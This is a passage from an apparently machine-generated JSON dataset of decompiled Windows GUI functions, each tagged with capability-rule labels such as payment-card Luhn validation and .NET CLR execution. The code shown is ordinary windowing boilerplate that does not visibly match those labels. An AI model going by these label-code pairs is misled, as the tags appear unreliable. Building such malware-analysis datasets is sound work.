        "decompiled_code": "\nvoid fcn.0042e124(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x42e19b;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x42e163;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.004419a8();\n    *in_FS_OFFSET = uStack48;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x42e1a2;\n    uStack32 = 0x42e19a;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 233
    },
    "0042e1ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042e1ac(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        puStack44 = 0x42e1c6;\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    uStack48 = 0x42e461;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &fcn.0042e1ac::var_1h + 1;\n    var_1h._0_1_ = param_2;\n    fcn.00427540();\n    fcn.00423730();\n    fcn.00403ffc();\n    piVar1 = fcn.0042a2dc();\n    in_EAX[0x2e] = piVar1;\n    (**(*piVar1 + 0x18))();\n    fcn.0043955c();\n    (**(*piVar1 + 0x84))(200, 0xa9);\n    fcn.0042a72c();\n    fcn.0042a764();\n    fcn.0043ff24();\n    piVar1 = fcn.004321b4();\n    in_EAX[0x2f] = piVar1;\n    (**(*piVar1 + 0x18))();\n    fcn.0043955c();\n    (**(*piVar1 + 0x84))(0x17, 0x9d);\n    fcn.00438a40();\n    (**(*piVar1 + 0x5c))();\n    (**(*piVar1 + 0x68))();\n    piVar1 = fcn.0042cf84();\n    in_EAX[0x30] = piVar1;\n    (**(*piVar1 + 0x18))();\n    (**(*piVar1 + 0x84))(0x16, 0x17);\n    (**(*piVar1 + 100))();\n    fcn.0042d758();\n    fcn.0042236c();\n    fcn.00405b0c();\n    fcn.004396a0();\n    fcn.0043967c();\n    piVar1[0x49] = in_EAX;\n    piVar1[0x48] = *(*in_EAX + 0x44);\n    (**(*piVar1 + 0x68))();\n    piVar1 = fcn.0042a2dc();\n    in_EAX[0x31] = piVar1;\n    (**(*piVar1 + 0x18))();\n    fcn.0043955c();\n    uVar3 = 0x91;\n    (**(*piVar1 + 0x84))(0x91, 0x9d);\n    fcn.00438a40();\n    fcn.0042a710();\n    fcn.0042a72c();\n    fcn.0043ff24();\n    iVar2 = fcn.00429b34();\n    in_EAX[0x32] = iVar2;\n    (**(*piVar1 + 0x68))();\n    piVar1 = in_EAX[0x32];\n    (**(*piVar1 + 0x18))();\n    fcn.00438a40();\n    piVar1[0x4b] = in_EAX;\n    piVar1[0x4a] = *(*in_EAX + 0x44);\n    (**(*piVar1 + 0x68))();\n    fcn.00429f60();\n    fcn.00429f30();\n    fcn.00429f08();\n    *(piVar1 + 0x17a) = 1;\n    *in_FS_OFFSET = uVar3;\n    fcn.00403fa8(0x42e468);\n    return;\n}\n",
        "token_count": 955
    },
    "0042e528": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042e528(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint *arg_8h;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_ch = 0;\n    var_8h = 0;\n    uVar3 = 1;\n    uStack64 = 0x42e700;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x42e55e;\n    var_4h = in_EAX;\n    fcn.00427d88();\n    puStack72 = 0x42e56f;\n    fcn.004043b4();\n    if (uVar3) goto code_r0x0042e6d0;\n    puStack72 = 0x42e585;\n    fcn.00403ffc();\n    puStack72 = 0x42e58d;\n    cVar2 = fcn.0040841c();\n    if (cVar2 == '\\0') {\ncode_r0x0042e59d:\n        bVar1 = false;\n    }\n    else {\n        puStack72 = 0x42e599;\n        cVar2 = fcn.0042e510();\n        if (cVar2 == '\\0') goto code_r0x0042e59d;\n        bVar1 = true;\n    }\n    if (bVar1) {\n        uStack76 = 0x42e664;\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack72 = &stack0xfffffffc;\n        fcn.0041fa08();\n        arg_8h = &fcn.0042e528::var_ch;\n        fcn.00405b0c();\n        fcn.0041fe50(0);\n        fcn.0041fe68();\n        fcn.00408cb8(arg_8h);\n        fcn.0043955c();\n        (**(**(var_4h + 0xc0) + 100))();\n        fcn.0043955c();\n        *in_FS_OFFSET = uStack80;\n    }\n    else {\n        puStack72 = 0x42e681;\n        fcn.00405b0c();\n        puStack72 = 0x42e692;\n        fcn.0043955c();\n        puStack72 = 0x42e6a2;\n        (**(**(var_4h + 0xc0) + 100))();\n        puStack72 = 0x42e6b2;\n        fcn.00429f20();\n        puStack72 = 0x42e6bf;\n        fcn.00405b0c();\n        puStack72 = 0x42e6d0;\n        fcn.0043955c();\n    }\ncode_r0x0042e6d0:\n    puStack72 = 0x42e6d8;\n    fcn.00427740();\n    *in_FS_OFFSET = uStack68;\n    puStack60 = 0x42e707;\n    uStack64 = 0x42e6f2;\n    fcn.00403fcc();\n    uStack64 = 0x42e6ff;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 862
    },
    "0042e724": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042e724(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar1;\n    int32_t iStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    int32_t var_ch;\n    \n    puStack64 = &stack0xfffffffc;\n    uStack68 = 0x42e7fc;\n    iStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack72;\n    iVar1 = in_EAX[0xf];\n    sub.user32.dll_GetClientRect(iVar1, &var_10h);\n    (**(*in_EAX + 0x40))();\n    var_ch = var_ch + 4;\n    fcn.00438eec();\n    fcn.00438ecc();\n    fcn.00438c9c();\n    fcn.00429f20();\n    fcn.00403fa8();\n    fcn.00405b0c();\n    fcn.0043955c();\n    fcn.0043d43c();\n    fcn.004274a8();\n    *in_FS_OFFSET = iVar1;\n    iStack72 = 0x42e803;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 320
    },
    "0042e83c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid fcn.0042e83c(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x42eaa3;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack40 = 0x42e868;\n    piVar1 = fcn.00451b1c();\n    uStack44 = 0x42ea86;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    (**(*piVar1 + 0x18))();\n    fcn.00452960();\n    fcn.00405b0c();\n    fcn.0043955c();\n    fcn.004532e0();\n    *(piVar1 + 0x22d) = 1;\n    fcn.00453940();\n    piVar1[0x79] = in_EAX;\n    piVar1[0x78] = 0x42eae8;\n    piVar2 = fcn.0042a2dc();\n    (**(*piVar2 + 0x18))();\n    fcn.0043955c();\n    fcn.00438a40();\n    fcn.0042a72c();\n    fcn.0042a780();\n    fcn.0042a764();\n    fcn.004396cc();\n    (**(*piVar2 + 0x68))();\n    *(piVar2 + 0x7e) = 1;\n    piVar2 = fcn.00429b34();\n    (**(*piVar2 + 0x18))();\n    fcn.00438a40();\n    fcn.00429f30();\n    fcn.00429f60();\n    fcn.00429f08();\n    (**(*piVar2[0x5a] + 8))();\n    (**(*piVar2 + 0x68))();\n    iVar3 = fcn.0041fe50();\n    if (0 < iVar3) {\n        iVar3 = fcn.00438f30();\n        iVar4 = fcn.00438f30();\n        iVar5 = fcn.0041fe50();\n        fcn.004534b0((iVar3 - iVar4) + iVar5 + 10);\n        fcn.00456c2c();\n        fcn.00423d78();\n        fcn.00452900();\n        iVar3 = fcn.00438f74();\n        iVar4 = fcn.00438f74();\n        iVar5 = fcn.0041fe68();\n        fcn.004534b0((iVar3 - iVar4) + iVar5 + 10);\n        fcn.00456bf8();\n        fcn.00423d78();\n        fcn.00452930();\n    }\n    (**(*piVar1 + 0xec))();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x42ea8d;\n    uStack44 = 0x42ea85;\n    fcn.00403258();\n    return;\n}\n",
        "token_count": 796
    },
    "0042f290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f290(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0042f1e0();\n    (***0x461f4c)(uVar1);\n    return;\n}\n",
        "token_count": 88
    },
    "0042f2e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f2e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0042f1e0();\n    (***0x462024)(uVar1);\n    return;\n}\n",
        "token_count": 93
    },
    "0042f32c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f32c(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0042f1e0();\n    (***0x461fec)(uVar1);\n    return;\n}\n",
        "token_count": 80
    },
    "0042f370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f370(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0042f1e0();\n    (***0x462164)(uVar1);\n    return;\n}\n",
        "token_count": 85
    },
    "0042f420": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f420(uint arg_8h, uint arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint var_1ch;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = *arg_10h;\n    uStack28 = arg_10h[1];\n    uStack24 = arg_10h[2];\n    uStack20 = arg_10h[3];\n    var_ch = *in_ECX;\n    var_8h = in_ECX[1];\n    var_4h = in_ECX[2];\n    uVar1 = fcn.004047f4(arg_ch, arg_8h, &var_1ch);\n    fcn.004047e4(uVar1);\n    uVar1 = fcn.0042f1e0();\n    (***0x46212c)(uVar1);\n    return;\n}\n",
        "token_count": 244
    },
    "0042f96c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f96c(char param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    uint uStack116;\n    uint *puStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint uStack92;\n    uint uStack88;\n    int32_t var_44h;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint var_34h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    int32_t var_18h;\n    int32_t iStack24;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hdc;\n    uint var_4h;\n    \n    uStack88 = 0xffffffec;\n    uStack92 = 0x42f986;\n    var_4h = param_2;\n    uStack92 = fcn.0043fd08();\n    puStack96 = 0x42f98c;\n    uVar1 = sub.user32.dll_GetWindowLongA();\n    if ((uVar1 & 0x200) != 0) {\n        puStack96 = &fcn.0042f96c::nLeftRect;\n        uStack100 = 0x42f9a1;\n        uStack100 = fcn.0043fd08();\n        iStack104 = 0x42f9a7;\n        sub.user32.dll_GetWindowRect();\n        iStack104 = -nTopRect;\n        iStack108 = -nLeftRect;\n        puStack112 = &fcn.0042f96c::nLeftRect;\n        uStack116 = 0x42f9bc;\n        sub.user32.dll_OffsetRect();\n        uStack116 = 0x42f9c4;\n        uStack116 = fcn.0043fd08();\n        puStack120 = 0x42f9ca;\n        hdc = sub.user32.dll_GetWindowDC();\n        uStack124 = 0x42fac7;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        var_18h = nLeftRect;\n        iStack24 = nTopRect;\n        var_10h = nRightRect;\n        var_ch = nBottomRect;\n        puStack120 = &stack0xfffffffc;\n        if (param_1 != '\\0') {\n            puStack120 = &stack0xfffffffc;\n            uVar2 = fcn.0043fd08(0xfffffff0);\n            uVar1 = sub.user32.dll_GetWindowLongA(uVar2);\n            if (((uVar1 & 0x100000) != 0) && ((uVar1 & 0x200000) != 0)) {\n                sub.user32.dll_GetSystemMetrics(2);\n                sub.user32.dll_GetSystemMetrics(3);\n                sub.user32.dll_InflateRect(&fcn.0042f96c::var_18h, 0xfffffffe, 0xfffffffe);\n                fcn.00412730(&fcn.0042f96c::var_44h, var_ch);\n                var_18h = var_44h;\n                iStack24 = iStack68;\n                var_10h = iStack64;\n                var_ch = iStack60;\n                uVar2 = sub.user32.dll_GetSysColorBrush(0xf);\n                sub.user32.dll_FillRect(hdc, &fcn.0042f96c::var_18h, uVar2);\n            }\n        }\n        sub.gdi32.dll_ExcludeClipRect(hdc, nLeftRect + 2, nTopRect + 2, nRightRect + -2, nBottomRect + -2);\n        fcn.0042f508();\n        uVar2 = 0;\n        fcn.0042f32c(0, &fcn.0042f96c::nLeftRect);\n        *in_FS_OFFSET = uVar2;\n        uVar2 = fcn.0043fd08(hdc, 0x42face);\n        sub.user32.dll_ReleaseDC(uVar2);\n        return;\n    }\n    return;\n}\n",
        "token_count": 970
    },
    "00431c6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00431c6c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0044191c();\n    *(in_EAX + 0x50) = *0x431cc4;\n    fcn.00438ce8();\n    fcn.00438d0c();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 174
    },
    "004321b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004321b4(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00440e9c();\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x432244;\n    fcn.00438ce8();\n    fcn.00438d0c();\n    *(in_EAX + 0x16d) = 1;\n    *(in_EAX + 0x170) = 1;\n    fcn.0042f140();\n    cVar1 = fcn.0042f220();\n    if (cVar1 == '\\0') {\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x432248;\n    }\n    else {\n        *(in_EAX + 0x50) = ~*0x432248 & *(in_EAX + 0x50);\n    }\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 319
    },
    "00432dec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00432dec(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.004328bc();\n    fcn.00438ce8();\n    fcn.00438d0c();\n    *(in_EAX + 0x50) = *0x432e48;\n    *(in_EAX + 0x210) = 1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 186
    },
    "00433248": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00433248(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00445b48();\n    *(in_EAX + 0x60) = 0;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 149
    },
    "00433c34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00433c34(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_100h;\n    \n    sub.user32.dll_GetClassNameA(arg_8h, &var_100h, 0x100);\n    iVar1 = fcn.004086dc();\n    if (iVar1 == 0) {\n        *(arg_ch + 4) = arg_8h;\n        *(arg_ch + 0xc) = 1;\n    }\n    return -(*(arg_ch + 0xc) != '\\x01');\n}\n",
        "token_count": 132
    },
    "00433c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00433c90(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_100h;\n    \n    sub.user32.dll_GetClassNameA(arg_8h, &var_100h, 0x100);\n    iVar1 = fcn.004086b8();\n    if (iVar1 == 0) {\n        *(arg_ch + 0xd) = 1;\n        *(arg_ch + 8) = arg_8h;\n    }\n    return -(*(arg_ch + 0xd) != '\\x01');\n}\n",
        "token_count": 133
    },
    "00433d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t __fastcall fcn.00433d90(uint param_1, int32_t param_2)\n\n{\n    uint8_t uStack11;\n    \n    uStack11 = *(param_2 + 0xc) >> 8;\n    return uStack11 ^ 1;\n}\n",
        "token_count": 63
    },
    "00433e94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00433e94(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    fcn.00405660();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 138
    },
    "00433f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00433f80(void)\n\n{\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x433fd2;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar1 = *0x463b04 == 0;\n    *0x463b04 = *0x463b04 + -1;\n    if (bVar1) {\n        *0x463b08 = fcn.00433e94();\n        fcn.00405648();\n        fcn.00424cf8();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 179
    },
    "00436680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436680(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar auStack16 [8];\n    \n    puVar3 = auStack16;\n    iVar1 = param_2;\n    sub.gdi32.dll_GetWindowOrgEx(param_2, auStack16);\n    iVar2 = param_2;\n    sub.gdi32.dll_SetWindowOrgEx(param_2, iVar1 + *(in_EAX + 0x40), puVar3 + *(in_EAX + 0x44), 0);\n    iVar1 = param_2;\n    fcn.0043a6d4(param_2);\n    sub.gdi32.dll_SetWindowOrgEx(param_2, iVar1, iVar2, 0);\n    return;\n}\n",
        "token_count": 197
    },
    "00436804": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436804(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = fcn.004026bc();\n    *puVar2 = param_2;\n    uVar3 = fcn.004367dc(&stack0xfffffffc);\n    puVar2[1] = uVar3;\n    cVar1 = fcn.004367a8();\n    if (cVar1 == '\\0') {\n        fcn.00413a08();\n    }\n    else {\n        fcn.00413be0();\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "00436994": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436994(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x436a5e;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    iVar1 = *param_2;\n    if (iVar1 < 0x216) {\n        if (iVar1 == 0x215) {\n            puStack32 = &stack0xfffffffc;\n            fcn.00437ab4();\n        }\n        else if (iVar1 == 0x200) {\n            puStack32 = &stack0xfffffffc;\n            fcn.00406960();\n            in_stack_ffffffd0 = *0x463b38;\n            sub.user32.dll_ClientToScreen(*0x463b38, &var_ch);\n            fcn.0043743c();\n        }\n        else if ((iVar1 == 0x202) || (iVar1 == 0x205)) {\n            puStack32 = &stack0xfffffffc;\n            fcn.00437ab4();\n        }\n    }\n    else if (iVar1 == 0xbd00) {\n        if (param_2[1] == 0x11) {\n            fcn.0043743c();\n        }\n        else if (param_2[1] == 0x1b) {\n            param_2[3] = 1;\n            puStack32 = &stack0xfffffffc;\n            fcn.00437ab4();\n        }\n    }\n    else if ((iVar1 == 0xbd01) && (param_2[1] == 0x11)) {\n        puStack32 = &stack0xfffffffc;\n        fcn.0043743c();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    return;\n}\n",
        "token_count": 462
    },
    "00436b28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436b28(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x38) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00437dd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00437dd8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h;\n    uint uStack24;\n    \n    iVar1 = fcn.00437da4();\n    iVar3 = 0;\n    if (iVar1 != 0) {\n        arg_8h = 0;\n        fcn.00439070();\n        iVar2 = fcn.0043d5f4(arg_8h);\n        iVar3 = iVar1;\n        if (iVar2 != 0) {\n            iVar3 = iVar2;\n        }\n    }\n    return CONCAT44(uStack24, iVar3);\n}\n",
        "token_count": 151
    },
    "00437e68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00437e68(void)\n\n{\n    sub.gdi32.dll_GetWindowOrgEx();\n    sub.gdi32.dll_SetWindowOrgEx();\n    return;\n}\n",
        "token_count": 38
    },
    "00437e98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00437e98(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack24 = 0x437ea8;\n    var_8h = fcn.00413ed0();\n    uStack28 = 0x437f48;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (-1 < *(var_8h + 8) + -1) {\n        var_4h = 0;\n        puStack24 = &stack0xfffffffc;\n        var_ch = *(var_8h + 8);\n        do {\n            puStack36 = 0x437eda;\n            var_10h = fcn.00413b64();\n            puStack36 = 0x437ee5;\n            cVar1 = fcn.0041d6a0();\n            if (cVar1 != '\\0') {\n                uStack40 = 0x437f21;\n                uStack44 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd4;\n                puStack36 = &stack0xfffffffc;\n                fcn.004380d4();\n                fcn.00403a90();\n                fcn.00403a90();\n                return;\n            }\n            var_4h = var_4h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x437f4f;\n    uStack28 = 0x437f47;\n    fcn.00413f34();\n    return;\n}\n",
        "token_count": 437
    },
    "0043814c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043814c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "00438704": {
        "rules": [
